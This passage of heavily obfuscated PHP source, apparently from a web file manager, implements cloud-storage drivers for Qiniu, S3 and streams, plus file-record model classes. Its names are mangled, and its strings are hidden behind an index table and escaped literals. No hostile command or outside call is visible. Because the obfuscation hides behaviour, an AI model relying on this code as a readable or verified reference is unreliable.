$âØ¶ø©Ã += count($ºãÃ„ÅÆ[$ãÑôÁÃ[1462]]); } if ($àÍê¬ÇÉ === $ãÑôÁÃ[12]) { break; } continue; } if ($ğí¹Š¥æ) { if (!empty($ºãÃ„ÅÆ[$ãÑôÁÃ[1461]])) { return !0; } } else { if (!empty($ºãÃ„ÅÆ[$ãÑôÁÃ[1462]])) { return !0; } } if ($àÍê¬ÇÉ === $ãÑôÁÃ[12]) { break; } } if ($É§¬¸çÅ) { return array($ãÑôÁÃ[207] => $‹¯’¬Î‹, $ãÑôÁÃ[208] => $âØ¶ø©Ã); } return !1; } public function listAll($Ñó æÔ‡) { $×ÂŠñ =& $_SERVER[…É¦À–]; $¡¥û—¤ó = $this->fileList($Ñó æÔ‡, $×ÂŠñ[12], !0); $Ş¾óïİä = array_to_keyvalue($¡¥û—¤ó[$×ÂŠñ[83]], $×ÂŠñ[32]); foreach ($¡¥û—¤ó[$×ÂŠñ[82]] as $£¯µüÊÆ) { if (is_string($£¯µüÊÆ)) { $Ş¾óïİä[$£¯µüÊÆ] = array($×ÂŠñ[76] => 0); } } return $this->listAllFiles($Ñó æÔ‡, $Ş¾óïİä); } private function fileList($’ü§–ÅÎ, $ªÅğ¤ô = '', $á«É÷Ú† = 0) { $·¿¤ =& $_SERVER[…É¦À–]; $’ü§–ÅÎ = trim($’ü§–ÅÎ, $·¿¤[8]); $¼×Éê½› = empty($’ü§–ÅÎ) && $’ü§–ÅÎ !== $·¿¤[198] ? $·¿¤[12] : $’ü§–ÅÎ . $·¿¤[8]; $ü—‘ı×Õ = $·¿¤[12]; $ÑÄ¼¬ÅÁ = 1000; $§À»²Õ¦ = $Û“¤¬ú¥ = array(); while (!0) { check_abort(); list($–Óøµí, $±ü¬›–Î) = $this->bucketManager->listFiles($this->bucket, $¼×Éê½›, $ü—‘ı×Õ, $ÑÄ¼¬ÅÁ, $ªÅğ¤ô); if ($±ü¬›–Î) { break; } $ü—‘ı×Õ = array_key_exists($·¿¤[1427], $–Óøµí) ? $ü—‘ı×Õ = $–Óøµí[$·¿¤[1460]] : $·¿¤[12]; $ì†êğ‘Ô = isset($–Óøµí[$·¿¤[1461]]) ? $–Óøµí[$·¿¤[1461]] : array(); $–Æ÷Ì¦Ş = isset($–Óøµí[$·¿¤[1462]]) ? $–Óøµí[$·¿¤[1462]] : array(); foreach ($ì†êğ‘Ô as $³ÍÓÛ¶Ï) { if ($³ÍÓÛ¶Ï[$·¿¤[94]] == $¼×Éê½›) { continue; } $†öÍ‘³ä = $³ÍÓÛ¶Ï[$·¿¤[94]]; $‹Ãáßì³ = $³ÍÓÛ¶Ï[$·¿¤[1458]]; $³ÍÓÛ¶Ï[$·¿¤[76]] = $‹Ãáßì³; $ÑÂ“£»¶ = $‹Ãáßì³ == 0 && substr($†öÍ‘³ä, strlen($†öÍ‘³ä) - 1, 1) == $·¿¤[8] ? !0 : !1; $this->cacheMethodInfoSet($†öÍ‘³ä, $ÑÂ“£»¶, $³ÍÓÛ¶Ï); if ($ÑÂ“£»¶) { $§À»²Õ¦[] = $†öÍ‘³ä; continue; } $Û“¤¬ú¥[] = $á«É÷Ú† ? $³ÍÓÛ¶Ï : $†öÍ‘³ä; } foreach ($–Æ÷Ì¦Ş as $†öÍ‘³ä) { if ($†öÍ‘³ä == $¼×Éê½›) { continue; } $§À»²Õ¦[] = $†öÍ‘³ä; $this->cacheMethodInfoSet($†öÍ‘³ä, !0); } if ($ü—‘ı×Õ === $·¿¤[12]) { break; } } $this->cacheMethodInfoSet($’ü§–ÅÎ, !0); return array($·¿¤[82] => $§À»²Õ¦, $·¿¤[83] => $Û“¤¬ú¥); } public function canRead($²”¬ıİİ) { return $this->exist($²”¬ıİİ) ? !0 : !1; } public function canWrite($šÛ€î£ğ) { return $this->exist($šÛ€î£ğ) ? !0 : !1; } public function getContent($‡–÷Ş˜) { return $this->fileSubstr($‡–÷Ş˜, 0, -1); } public function setContent($‹¥Ïïí—, $–ì†¶ÆĞ = '') { $¯ó€‰ğ€ = $this->tempFile($this->pathThis($‹¥Ïïí—)); file_put_contents($¯ó€‰ğ€, $–ì†¶ÆĞ); if ($this->upload($‹¥Ïïí—, $¯ó€‰ğ€)) { $this->tempFileRemve($¯ó€‰ğ€); return !0; } return !1; } public function refreshUrls($¤ïõÒ·‚) { $ÄâÀ‡Ÿ =& $_SERVER[…É¦À–]; $ÊÕË¨¼Õ = array(); if (is_array($¤ïõÒ·‚)) { foreach ($¤ïõÒ·‚ as $ÆÄÓ©Ç¡) { $ÊÕË¨¼Õ[] = $this->link($ÆÄÓ©Ç¡); } } else { $ÊÕË¨¼Õ[] = $this->link($¤ïõÒ·‚); } $ìÒ—»Ÿ = new Qiniu\Cdn\CdnManager($this->auth); list($øË—²¿à, $ï™ÛİÚ–) = $ìÒ—»Ÿ->refreshUrls($ÊÕË¨¼Õ); if ($ï™ÛİÚ–) { return !1; } return $øË—²¿à[$ÄâÀ‡Ÿ[1227]] == $ÄâÀ‡Ÿ[799] ? !0 : !1; } public function fileSubstr($æ¢²õ£ô, $îÖÊúë«, $¡Õ²çÔ) { $õˆŒ³š =& $_SERVER[…É¦À–]; if (!($ı‰’Ê•“ = $this->link($æ¢²õ£ô))) { return !1; } $º¸šª‚ü = !1; if ($¡Õ²çÔ > 0) { $¬ª¶¹Õ‚ = $îÖÊúë« + $¡Õ²çÔ - 1; $º¸šª‚ü = array($õˆŒ³š[1463] . $îÖÊúë« . $õˆŒ³š[415] . $¬ª¶¹Õ‚); } $šßÌ…¨‘ = url_request($ı‰’Ê•“, $õˆŒ³š[230], !1, $º¸šª‚ü); return $šßÌ…¨‘[$õˆŒ³š[790]] ? $šßÌ…¨‘[$õˆŒ³š[1247]] : !1; } public function upload($¶Ÿ¯Ï–, $ü¯”­üĞ, $¢šó½º‘ = false, $Ë”‹ÕŠâ = REPEAT_REPLACE) { $¨ÃÑŠìá = new Qiniu\Storage\UploadManager(); $Œî¬ü¸Ø = $this->auth->uploadToken($this->bucket, $¶Ÿ¯Ï–); $×ÍŠ„üÓ = get_file_mime(get_path_ext($ü¯”­üĞ)); list($³¯ÑºÌ, $á‘¸ÄÎ) = $¨ÃÑŠìá->putFile($Œî¬ü¸Ø, $¶Ÿ¯Ï–, $ü¯”­üĞ, null, $×ÍŠ„üÓ); return $á‘¸ÄÎ ? !1 : $this->getPathOuter($¶Ÿ¯Ï–); } public function uploadFormData($”ı¦‚Ğø, $•‡†¸¾Ì = 3600) { return $this->uploadToken($”ı¦‚Ğø, $•‡†¸¾Ì); } public function multiUploadFormData($ÀŒµèÂô, $©Î¡à£æ = 3600) { return $this->uploadToken($ÀŒµèÂô, $©Î¡à£æ); } private function uploadToken($©õ»Ô¡æ, $‡ÛŸ€Ë’ = 3600) { $•åÒù³½ =& $_SERVER[…É¦À–]; $Æó¡Å¢‘ = $‡ÛŸ€Ë’; $ã÷İµ‡Š = array($•åÒù³½[1464] => $•åÒù³½[1465]); $¿˜ı©Â‹ = $©õ»Ô¡æ; $ßùÙõ›ê = $this->auth->uploadToken($this->bucket, $¿˜ı©Â‹, $Æó¡Å¢‘, $ã÷İµ‡Š, !0); $³¶Úø«‡ = empty($this->region) || $this->region == $•åÒù³½[1466] ? $•åÒù³½[12] : $•åÒù³½[415] . $this->region; $¼€³ó·† = http_type() . "\72\x2f\x2f\x75\160\154\157\141\x64{$³¶Úø«‡}\x2e\x71\x69\x6e\151\165\160\56\143\x6f\155\57"; return array($•åÒù³½[1467] => $ßùÙõ›ê, $•åÒù³½[1468] => $¼€³ó·†); } public function download($Ì–ÙÂÎ, $š±‘£ÛÚ) { $¿ûä¬åƒ = IO::getPathInner(IO::mkfile($š±‘£ÛÚ)); if (!($†Çí¤â³ = $this->link($Ì–ÙÂÎ))) { return !1; } $‘Å¬åÍ· = 0; $À¥ı·ˆÆ = 1024 * 200; $Àœ¯ó÷ = fopen($¿ûä¬åƒ, $_SERVER[…É¦À–][1469]); while (!0) { $’²å£Û‘ = $this->fileSubstr($Ì–ÙÂÎ, $‘Å¬åÍ·, $À¥ı·ˆÆ); if ($’²å£Û‘ === !1) { return !1; } fwrite($Àœ¯ó÷, $’²å£Û‘); $‘Å¬åÍ· += $À¥ı·ˆÆ; if (strlen($’²å£Û‘) < $À¥ı·ˆÆ) { break; } } fclose($Àœ¯ó÷); return $š±‘£ÛÚ; } public function link($ßĞ Äµì, $êñÂõàò = '') { if (!$this->isFile($ßĞ Äµì)) { return !1; } $‡Œ’ó = $this->getHost() . $_SERVER[…É¦À–][8] . $this->pathEncode($ßĞ Äµì) . $êñÂõàò; return $this->auth->privateDownloadUrl($‡Œ’ó, 3600 * 12); } public function fileOut($¯¸§‹ ¨, $³¿«îšÅ = false, $ˆ–àø— = false, $˜»ù½ = '') { $¢º£ÇèÎ =& $_SERVER[…É¦À–]; if ($this->isFileOutServer()) { return $this->fileOutServer($¯¸§‹ ¨, $³¿«îšÅ, $ˆ–àø—, $˜»ù½); } if (!$ˆ–àø—) { $ˆ–àø— = $this->pathThis($¯¸§‹ ¨); } $ìàúÏ = $³¿«îšÅ ? $¢º£ÇèÎ[1470] . rawurlencode($ˆ–àø—) : $¢º£ÇèÎ[12]; $õ¬÷ ³à = $this->link($¯¸§‹ ¨, $ìàúÏ); $this->fileOutLink($õ¬÷ ³à); } public function fileOutServer($ì¶†šÌÖ, $Ìàı¥†ı = false, $öŞ–«™Œ = false, $Íñİ÷ƒ¤ = '') { parent::fileOut($ì¶†šÌÖ, $Ìàı¥†ı, $öŞ–«™Œ, $Íñİ÷ƒ¤); } public function fileOutImage($üşîı½, $ˆ‚ÛÃı = 250) { $ãèêÏ–Ï = $this->link($üşîı½, $_SERVER[…É¦À–][1471] . $ˆ‚ÛÃı); $this->fileOutLink($ãèêÏ–Ï); } public function fileOutImageServer($ßÁ’ş¢Ş, $üùˆûÚô = 250) { parent::fileOutImage($ßÁ’ş¢Ş, $üùˆûÚô); } public function hashMd5($ ÷Ûú²´) { $ãÎ•ˆ“§ =& $_SERVER[…É¦À–]; $ˆÛ»Ø¿ = $this->objectMeta($ ÷Ûú²´); return isset($ˆÛ»Ø¿[$ãÎ•ˆ“§[212]]) ? $ˆÛ»Ø¿[$ãÎ•ˆ“§[212]] : !1; $¹·‡¶î… = $this->link($ ÷Ûú²´, $ãÎ•ˆ“§[1472]); } public function size($Úé‘´ë) { $˜¸•ÖÔÂ = $this->objectMeta($Úé‘´ë); return $˜¸•ÖÔÂ ? $˜¸•ÖÔÂ[$_SERVER[…É¦À–][76]] : 0; } public function info($§µ°è¬) { if ($this->isFolder($§µ°è¬)) { return $this->folderInfo($§µ°è¬); } else { if ($this->isFile($§µ°è¬)) { return $this->fileInfo($§µ°è¬); } } return !1; } public function exist($±İæ×¤) { return $this->isFile($±İæ×¤) || $this->isFolder($±İæ×¤); } public function isFile($†Üü’) { return !$this->isFolder($†Üü’) && $this->objectMeta($†Üü’); } public function isFolder($Ÿ¬Ó‡š´) { return $this->cacheMethod($_SERVER[…É¦À–][165], $Ÿ¬Ó‡š´); } protected function objectMeta($Ù‡š¶†Ö) { return $this->cacheMethod($_SERVER[…É¦À–][167], $Ù‡š¶†Ö); } protected function _objectMeta($¨±ûÀ Ô) { $§ÈÊéÒ¡ =& $_SERVER[…É¦À–]; list($€ÍÛñº, $âÉëÆö’) = $this->bucketManager->stat($this->bucket, $¨±ûÀ Ô); if ($€ÍÛñº) { $€ÍÛñº[$§ÈÊéÒ¡[76]] = intval($€ÍÛñº[$§ÈÊéÒ¡[1458]]); } return $€ÍÛñº; } protected function _isFolder($öôû‘ç) { $°Ûú²ŸŸ =& $_SERVER[…É¦À–]; if ($öôû‘ç == $°Ûú²ŸŸ[12] || $öôû‘ç == $°Ûú²ŸŸ[8]) { return !0; } list($şø¥Òé, $ó€Ôâ “) = $this->bucketManager->listFiles($this->bucket, trim($öôû‘ç, $°Ûú²ŸŸ[8]) . $°Ûú²ŸŸ[8], $°Ûú²ŸŸ[12], 1, $°Ûú²ŸŸ[8]); return !empty($şø¥Òé[$°Ûú²ŸŸ[1461]]) || !empty($şø¥Òé[$°Ûú²ŸŸ[1462]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Å¹Ì¸Ë‰) { parent::__construct($Å¹Ì¸Ë‰); } public function uploadFormData($â•ÓÖö, $•è†¬İï = 3600) { $¹Ô‹½ú =& $_SERVER[…É¦À–]; $ ¨”ˆ¾ç = $¹Ô‹½ú[199]; $„Ëêî¼— = $¹Ô‹½ú[238]; $ÒØ³¼·µ = $¹Ô‹½ú[62]; $îÌ×œ®û = gmdate($¹Ô‹½ú[239]); $ÑßÖ²İê = gmdate($¹Ô‹½ú[240]); $©„ëÌªş = $¹Ô‹½ú[241]; $ó¸Ş•»Ğ = $•è†¬İï . $¹Ô‹½ú[12]; $¨‚â’òõ = $¹Ô‹½ú[242]; $­Î¦¹ãÈ = array($this->accessKey, $ÑßÖ²İê, $this->region, $ÒØ³¼·µ, $©„ëÌªş); $Ÿ“¸¦ñ¡ = implode($¹Ô‹½ú[8], $­Î¦¹ãÈ); $ÍãûòÒØ = array($¹Ô‹½ú[243] => gmdate($¹Ô‹½ú[1370], strtotime($¹Ô‹½ú[245])), $¹Ô‹½ú[246] => array(array($¹Ô‹½ú[247] => $this->bucket), array($¹Ô‹½ú[248] => $ ¨”ˆ¾ç), array($¹Ô‹½ú[249], $¹Ô‹½ú[250], $¹Ô‹½ú[12]), array($¹Ô‹½ú[249], $¹Ô‹½ú[251], $¹Ô‹½ú[12]), array($¹Ô‹½ú[249], $¹Ô‹½ú[252], $¹Ô‹½ú[12]), array($¹Ô‹½ú[253] => $¨‚â’òõ), array($¹Ô‹½ú[254] => $Ÿ“¸¦ñ¡), array($¹Ô‹½ú[255] => $„Ëêî¼—), array($¹Ô‹½ú[256] => $îÌ×œ®û), array($¹Ô‹½ú[257] => $ó¸Ş•»Ğ))); $¥ÙÛâ£ã = base64_encode(json_encode($ÍãûòÒØ)); $’ö¹ö = hash_hmac($¹Ô‹½ú[258], $ÑßÖ²İê, $¹Ô‹½ú[259] . $this->secret, !0); $­²Ÿ = hash_hmac($¹Ô‹½ú[258], $this->region, $’ö¹ö, !0); $ÈŸ¬®· = hash_hmac($¹Ô‹½ú[258], $ÒØ³¼·µ, $­²Ÿ, !0); $°€Ø†‰ = hash_hmac($¹Ô‹½ú[258], $©„ëÌªş, $ÈŸ¬®·, !0); $±€Æ’òæ = hash_hmac($¹Ô‹½ú[258], $¥ÙÛâ£ã, $°€Ø†‰); $æ©ôÏ’² = array($¹Ô‹½ú[215] => $¹Ô‹½ú[12], $¹Ô‹½ú[260] => $¹Ô‹½ú[12], $¹Ô‹½ú[248] => $ ¨”ˆ¾ç, $¹Ô‹½ú[253] => $¨‚â’òõ, $¹Ô‹½ú[261] => $¥ÙÛâ£ã, $¹Ô‹½ú[262] => $Ÿ“¸¦ñ¡, $¹Ô‹½ú[263] => $„Ëêî¼—, $¹Ô‹½ú[264] => $îÌ×œ®û, $¹Ô‹½ú[265] => $ó¸Ş•»Ğ, $¹Ô‹½ú[266] => $±€Æ’òæ, $¹Ô‹½ú[182] => $this->getHost()); return $æ©ôÏ’²; } public function multiUploadFormData($¤¸õ·©, $ëŠØÎóµ = 3600) { $êóÂÁÏ¢ =& $_SERVER[…É¦À–]; $§¡°Ú„ƒ = gmdate($êóÂÁÏ¢[1473]); $ôİ¦öú = array(); $Î°¬ñ£ = $this->client->getUploadId($this->bucket, $¤¸õ·©, $ôİ¦öú); if (!$Î°¬ñ£) { return !1; } return array($êóÂÁÏ¢[223] => $Î°¬ñ£, $êóÂÁÏ¢[182] => $this->getHost() . $êóÂÁÏ¢[8] . $this->pathEncode($¤¸õ·©), $êóÂÁÏ¢[224] => $§¡°Ú„ƒ, $êóÂÁÏ¢[94] => $¤¸õ·©); } public function multiUploadAuthData($“ŞÑÇ, $°›Íİğ÷ = array()) { $£¼Ê¶´’ =& $_SERVER[…É¦À–]; $ŒŠôÕÆ = isset($°›Íİğ÷[$£¼Ê¶´’[174]]) ? $°›Íİğ÷[$£¼Ê¶´’[174]] : $£¼Ê¶´’[12]; $«ÁÑäœ = $°›Íİğ÷[$£¼Ê¶´’[94]]; unset($°›Íİğ÷[$£¼Ê¶´’[94]]); if (isset($°›Íİğ÷[$£¼Ê¶´’[225]])) { return $this->listUploadParts($«ÁÑäœ, $°›Íİğ÷); } $ëÔÖ×äÌ = array(); if (isset($°›Íİğ÷[$£¼Ê¶´’[1474]])) { $ëÔÖ×äÌ[$£¼Ê¶´’[1475]] = $°›Íİğ÷[$£¼Ê¶´’[1474]]; } $£ƒİçÏÙ = explode($£¼Ê¶´’[184], $this->getHost()); $¶ğ„Êä¥ = array($£¼Ê¶´’[1476] => $£ƒİçÏÙ[1], $£¼Ê¶´’[1477] => $£¼Ê¶´’[12], $£¼Ê¶´’[215] => $£¼Ê¶´’[120], $£¼Ê¶´’[260] => $°›Íİğ÷[$£¼Ê¶´’[76]]); $•üâûæÎ = $£¼Ê¶´’[228]; $ÓÄ¹¹»‰ = $£¼Ê¶´’[8] . $this->pathEncode($«ÁÑäœ) . $ŒŠôÕÆ; $¦šÉ¯ù = $this->client->__getSignatureV4($ëÔÖ×äÌ, $¶ğ„Êä¥, $•üâûæÎ, $ÓÄ¹¹»‰); if (strpos($ŒŠôÕÆ, $£¼Ê¶´’[227]) === 0) { if (isset($ëÔÖ×äÌ[$£¼Ê¶´’[1475]])) { $¿ôûØãÎ = $ëÔÖ×äÌ[$£¼Ê¶´’[1475]]; } else { if (isset($¦šÉ¯ù[$£¼Ê¶´’[1475]])) { $¿ôûØãÎ = $¦šÉ¯ù[$£¼Ê¶´’[1475]]; } else { $¿ôûØãÎ = hash($£¼Ê¶´’[258], $£¼Ê¶´’[12]); } } return array($£¼Ê¶´’[234] => $¦šÉ¯ù[$£¼Ê¶´’[234]], $£¼Ê¶´’[1475] => $¿ôûØãÎ, $£¼Ê¶´’[224] => $¦šÉ¯ù[$£¼Ê¶´’[1478]]); } return $¦šÉ¯ù[$£¼Ê¶´’[234]]; } public function listUploadParts($‰âÓß“, $ÃôáÅÊ’ = array()) { $¦è…»áª =& $_SERVER[…É¦À–]; $˜·‚øÁë = str_replace($¦è…»áª[235], $¦è…»áª[12], $ÃôáÅÊ’[$¦è…»áª[174]]); $Ãåêİ®¦ = $this->client->listParts($this->bucket, $‰âÓß“, $˜·‚øÁë); if (!$Ãåêİ®¦) { return !1; } $¾Ù®‰± = $¦è…»áª[1479]; foreach ($Ãåêİ®¦ as $²Ã£ş¿ò) { $¾Ù®‰± .= $¦è…»áª[1480] . "\x3c\120\x61\162\164\x4e\x75\x6d\x62\x65\x72\x3e{$²Ã£ş¿ò[$¦è…»áª[1434]]}\74\57\120\141\x72\x74\x4e\165\x6d\142\x65\x72\x3e\xa" . "\74\x45\124\141\x67\76{$²Ã£ş¿ò[$¦è…»áª[1435]]}\74\57\x45\124\141\147\x3e\12" . $¦è…»áª[1481]; } $¾Ù®‰± .= $¦è…»áª[1482]; $´£šßà = array(); $•œô¸ = explode($¦è…»áª[184], $this->getHost()); $²ú¢¶Ğã = array($¦è…»áª[1476] => $•œô¸[1], $¦è…»áª[215] => $¦è…»áª[120], $¦è…»áª[260] => strlen($¾Ù®‰±)); $÷‘³òí­ = $¦è…»áª[226]; $ú×ÎÃ‘¬ = $¦è…»áª[8] . $this->pathEncode($‰âÓß“) . $ÃôáÅÊ’[$¦è…»áª[174]]; $’ •ØŒ = $this->client->__getSignatureV4($´£šßà, $²ú¢¶Ğã, $÷‘³òí­, $ú×ÎÃ‘¬, $¾Ù®‰±); return array($¦è…»áª[234] => $’ •ØŒ[$¦è…»áª[234]], $¦è…»áª[224] => $’ •ØŒ[$¦è…»áª[1478]], $¦è…»áª[236] => $Ãåêİ®¦, $¦è…»áª[1475] => $’ •ØŒ[$¦è…»áª[1475]]); } public function link($Ó¿ßÌÁ†, $Å–ñ£í® = array()) { return parent::link($Ó¿ßÌÁ†, $Å–ñ£í®); } public function fileOut($¶÷ƒ…ÃÄ, $ÖïìÜ‰ğ = false, $ĞŸĞ‹Ô = false, $ôÚÎØ­é = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[…É¦À–][1483])) { return parent::fileOutServer($¶÷ƒ…ÃÄ, $ÖïìÜ‰ğ, $ĞŸĞ‹Ô, $ôÚÎØ­é); } parent::fileOut($¶÷ƒ…ÃÄ, $ÖïìÜ‰ğ, $ĞŸĞ‹Ô, $ôÚÎØ­é); } public function fileOutImage($¬Ø²œ–, $¨¹îíø€ = 250) { if (strstr($this->endpoint, $_SERVER[…É¦À–][1483])) { return parent::fileOutImageServer($¬Ø²œ–, $¨¹îíø€); } parent::fileOutImage($¬Ø²œ–, $¨¹îíø€); } public function fileOutLink($ê…ûâ˜•) { $Êµİğ­ì =& $_SERVER[…É¦À–]; if (substr($ê…ûâ˜•, 0, 7) == $Êµİğ­ì[1376]) { $ê…ûâ˜• = $Êµİğ­ì[1377] . substr($ê…ûâ˜•, 7); } header($Êµİğ­ì[161] . $ê…ûâ˜•); die; } public function getHost() { $ÕœñáôÕ =& $_SERVER[…É¦À–]; $Ïœªê‹Å = str_rtrim(parent::getHost(), $ÕœñáôÕ[8] . $this->bucket); $Ïœªê‹Å = explode($ÕœñáôÕ[184], $Ïœªê‹Å); return $Ïœªê‹Å[0] . $ÕœñáôÕ[184] . $this->bucket . $ÕœñáôÕ[10] . $Ïœªê‹Å[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¦Ï³¿É‘, $–óòßØ = 0) { parent::__construct(); $this->source = $¦Ï³¿É‘; $this->sourceSize = $–óòßØ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÎŠé†Ü = false) { return $this->sourceSize; } public function getContent($Àô™ìåÎ = false) { return $this->fileSubstr($Àô™ìåÎ, 0, $this->sourceSize); } public function fileSubstr($Ì’££üâ = false, $ÉéÅÉéŞ = 0, $ì—¿Ğ¾ê = 0) { if (!$ì—¿Ğ¾ê) { $ì—¿Ğ¾ê = $this->sourceSize; } $Ã¦áŒú = $this->sourceSize - $ÉéÅÉéŞ; if ($ì—¿Ğ¾ê >= $Ã¦áŒú) { $ì—¿Ğ¾ê = $Ã¦áŒú; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÉéÅÉéŞ, $ì—¿Ğ¾ê); } if ($this->sourceType == self::TYPE_FILE) { if ($ì—¿Ğ¾ê <= 0) { return $_SERVER[…É¦À–][12]; } $úúé”ğ = ftell($this->source); fseek_64($this->source, $úúé”ğ + $ÉéÅÉéŞ); $Âƒ‡Œ”ä = @fread($this->source, $ì—¿Ğ¾ê); fseek_64($this->source, $úúé”ğ); return $Âƒ‡Œ”ä; } } public function hashMd5($ú˜±–Õ® = false) { return md5($this->getContent()); } public static function hash($Äéæ¦©•, $Íˆ¯á¨Œ = 0) { $ş²†¡Â = new PathDriverStream($Äéæ¦©•, $Íˆ¯á¨Œ); return $ş²†¡Â->hashSimple($Äéæ¦©•); } public static function md5($û’¡Ïß¬, $€§×™Ğå = 0) { $ÌãÖäĞı = new PathDriverStream($û’¡Ïß¬, $€§×™Ğå); return $ÌãÖäĞı->hashMd5($û’¡Ïß¬); } } goto aÀ‹Ìºö’ù; a¬Š—óª½: class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\x65\x5f\x63\157\x6e\164\145\156\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\155\145" => "\x69\x6f\x5f\x66\151\154\145\137\x6d\x65\164\141", "\155\x65\164\141\106\x69\145\154\144" => "\146\151\154\145\111\104"); public function fileInfo($óøÁ‚œÒ) { $´„ó¢®‹ =& $_SERVER[…É¦À–]; static $Ö„—ƒ¶› = array(); if (!isset($Ö„—ƒ¶›[$óøÁ‚œÒ])) { $Ë¶İÇ = $´„ó¢®‹[1926]; $ò·àî©Ë = Model($´„ó¢®‹[500])->field($Ë¶İÇ)->where(array($´„ó¢®‹[498] => $óøÁ‚œÒ))->find(); $Ö„—ƒ¶›[$óøÁ‚œÒ] = $ò·àî©Ë; } return $Ö„—ƒ¶›[$óøÁ‚œÒ]; } public function addFileByContent($ÒÜ‰óì = '', $Á“˜á¦Ğ = '') { $¹Ÿş€ˆ =& $_SERVER[…É¦À–]; $ÒöÄ¹Ì£ = TEMP_PATH . $¹Ÿş€ˆ[1927]; if (!is_dir($ÒöÄ¹Ì£)) { mk_dir($ÒöÄ¹Ì£); } $’­òî¨Å = $ÒöÄ¹Ì£ . $¹Ÿş€ˆ[1928] . rand_string(16); file_put_contents($’­òî¨Å, $ÒÜ‰óì); $†óÊ´—Æ = $this->addFile($’­òî¨Å, $Á“˜á¦Ğ, !0); if (file_exists($’­òî¨Å)) { @unlink($’­òî¨Å); } return $†óÊ´—Æ; } public function createFileName($Ù¥ƒ¢ª, $ß¹¥ÀŸ = false, $î‚Ú–é¼ = false) { $àİè¢Ã¿ =& $_SERVER[…É¦À–]; $ï•ïê½ = IO::init($àİè¢Ã¿[8]); $—ú‡Ñ×š = $this->makeFilePath($Ù¥ƒ¢ª, $ï•ïê½, $ß¹¥ÀŸ, $î‚Ú–é¼); $½—¸™§Î = $ï•ïê½->pathFather($—ú‡Ñ×š); static $ÚÑõš = false; $ˆä™úéŠ = $àİè¢Ã¿[1929] . md5($½—¸™§Î); if (!$ÚÑõš && !Cache::get($ˆä™úéŠ)) { $ÚÑõš = !0; $ìëšÄø = IO::mkdir($½—¸™§Î); if (!IO::exist($ìëšÄø . $àİè¢Ã¿[837])) { IO::mkfile($ìëšÄø . $àİè¢Ã¿[837]); } Cache::set($ˆä™úéŠ, 1, 3600 * 2); } return $—ú‡Ñ×š; } public function makeFilePath($³‡²¢÷, $Ğí¿âœ¿, $©ÆÀ§Í = false, $â·¯ÒŒË = false) { $ áÄîæ =& $_SERVER[…É¦À–]; $•ÎªõŞï = Model($ áÄîæ[810])->get($ áÄîæ[1930]); $€²»òÌ² = KodIO::defaultIO() . date($ áÄîæ[1931]); $çôº¿„ = $€²»òÌ² . rand_string(5) . short_id(100); $³‡²¢÷ = str_replace($ áÄîæ[8], $ áÄîæ[11], KodIO::clear($³‡²¢÷)); $ôÕáµ‡ = $Ğí¿âœ¿->ext($³‡²¢÷); if (!$³‡²¢÷) { $•ÎªõŞï = $ áÄîæ[1932]; } switch ($•ÎªõŞï) { case $ áÄîæ[1933]: $çôº¿„ = $çôº¿„ . $ áÄîæ[10] . $Ğí¿âœ¿->ext($³‡²¢÷); if ($ôÕáµ‡ == $ áÄîæ[1870]) { $çôº¿„ .= $ áÄîæ[1251]; } break; case $ áÄîæ[1934]: $ùÇÖğúû = Model($ áÄîæ[810])->get($ áÄîæ[811]); $†ŠÏÑà = substr(md5($ áÄîæ[812] . $ùÇÖğúû . date($ áÄîæ[788])), 0, 8); $âğ×«Ï” = KodIO::defaultDriver(); $€²»òÌ² = $ áÄîæ[1282] . $âğ×«Ï”[$ áÄîæ[428]] . $ áÄîæ[438] . date($ áÄîæ[1935]) . $†ŠÏÑà . $ áÄîæ[8]; if ($ôÕáµ‡ == $ áÄîæ[1870]) { $³‡²¢÷ .= $ áÄîæ[1251]; } $šÓ€•˜ = $ áÄîæ[1936] . $€²»òÌ² . $³‡²¢÷; CacheLock::lock($šÓ€•˜); $çôº¿„ = $€²»òÌ² . $³‡²¢÷; if (IO::exist($€²»òÌ² . $³‡²¢÷)) { $ë†ïçæ­ = substr($³‡²¢÷, 0, strlen($³‡²¢÷) - strlen($ôÕáµ‡)); $¶¿À·á± = $â·¯ÒŒË ? substr($â·¯ÒŒË, 0, 5) : ($©ÆÀ§Í ? substr($©ÆÀ§Í, 0, 5) : rand_string(5)); $çôº¿„ = $€²»òÌ² . $ë†ïçæ­ . $¶¿À·á± . $ áÄîæ[10] . $ôÕáµ‡; } if (IO::isTypeObject($çôº¿„) && !IO::isUploadServer($çôº¿„)) { if (IO::exist($çôº¿„)) { return $çôº¿„; } $£Ñç²ğ¨ = IO::setContent($çôº¿„, $ áÄîæ[12]); if (!$£Ñç²ğ¨) { show_json($ áÄîæ[1937], !1); } } CacheLock::unlock($šÓ€•˜); break; case $ áÄîæ[1932]: break; default: break; } return $çôº¿„; } public function addFileByRemote($ÏŞ‘¾¸, $ÑûÏ˜Î©, $æã¤Áæ¨ = array()) { $°®Ô‘ =& $_SERVER[…É¦À–]; if (!IO::exist($ÏŞ‘¾¸)) { return !1; } $Û— À« = $æã¤Áæ¨[$°®Ô‘[176]] ? $æã¤Áæ¨[$°®Ô‘[176]] : $°®Ô‘[12]; $ğáöĞñ— = IO::hashMd5($ÏŞ‘¾¸, $Û— À«); $•è­€ãÓ = KodIO::defaultDriver(); $òüÜ Şò = array($°®Ô‘[574] => IO::size($ÏŞ‘¾¸), $°®Ô‘[1938] => 1, $°®Ô‘[449] => $ÑûÏ˜Î©, $°®Ô‘[848] => $•è­€ãÓ[$°®Ô‘[428]], $°®Ô‘[450] => $ÏŞ‘¾¸, $°®Ô‘[1939] => $æã¤Áæ¨[$°®Ô‘[177]] ? $æã¤Áæ¨[$°®Ô‘[177]] : IO::hashSimple($ÏŞ‘¾¸), $°®Ô‘[1940] => $ğáöĞñ— ? $ğáöĞñ— : 